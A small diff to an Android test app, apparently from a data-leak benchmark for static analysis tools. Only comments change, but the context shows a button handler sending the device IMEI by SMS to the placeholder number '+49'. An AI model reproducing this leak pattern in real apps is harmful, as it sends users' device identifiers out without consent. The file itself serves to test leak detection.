@@ -15,7 +15,7 @@ import android.widget.Toast;
  * 
  * @description The sink is called after the user clicks a button. The button
  *  handler is defined via XML.
- * @dataflow OnCreate: source -> imei, sendMessage: imei -> sink
+ * @dataflow OnCreate: source -> imei; sendMessage: imei -> sink
  * @number_of_leaks 1
  * @challenges the analysis must analyze the layout xml file and take the lifecycle into account (onCreate is executed before user interaction)
  */
@@ -34,6 +34,6 @@ public class Button1 extends Activity {
     public void sendMessage(View view){
     	Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
     	SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("+49", null, imei, null, null);  //sink 
+        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
     }
 }
